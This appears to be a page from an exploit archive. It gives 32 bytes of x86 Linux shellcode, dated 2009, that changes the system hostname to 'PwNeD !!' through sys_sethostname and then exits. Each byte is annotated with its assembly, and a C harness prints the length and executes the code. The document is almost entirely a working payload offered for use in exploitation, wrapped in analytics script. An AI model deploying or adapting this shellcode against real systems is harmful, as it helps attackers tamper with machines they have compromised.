<html><head><title>Linux/x86 - sys_sethostname(PwNeD !!, 8) - 32 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title  : sethostname &quot;pwned !!&quot;
Name   : 32 bytes sys_sethostname(&quot;PwNeD !!&quot;,8) x86 linux shellcode
Date   : may, 31 2009
Author : gunslinger_ &lt;yudha.gunslinger[at]gmail.com&gt;
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian
*/

#include &lt;stdio.h&gt;

char *shellcode=
 &quot;\xeb\x11&quot;                    /* jmp    0x8048073 */
 &quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
 &quot;\xb0\x4a&quot;                    /* mov    $0x4a,%al */
 &quot;\x5b&quot;                        /* pop    %ebx */
 &quot;\xb1\x08&quot;                    /* mov    $0x8,%cl */
 &quot;\xcd\x80&quot;                    /* int    $0x80 */
 &quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
 &quot;\xb0\x01&quot;                    /* mov    $0x1,%al */
 &quot;\x31\xdb&quot;                    /* xor    %ebx,%ebx */
 &quot;\xcd\x80&quot;                    /* int    $0x80 */
 &quot;\xe8\xea\xff\xff\xff&quot;        /* call   0x8048062 */
 &quot;\x50&quot;                        /* push   %eax */
 &quot;\x77\x4e&quot;                    /* ja     0x80480c9 */
 &quot;\x65&quot;                        /* gs */
 &quot;\x44&quot;                        /* inc    %esp */
 &quot;\x20\x21&quot;                    /* and    %ah,(%ecx) */
 &quot;\x21&quot;;                        /* .byte 0x21 */

int main(void)
{
		fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
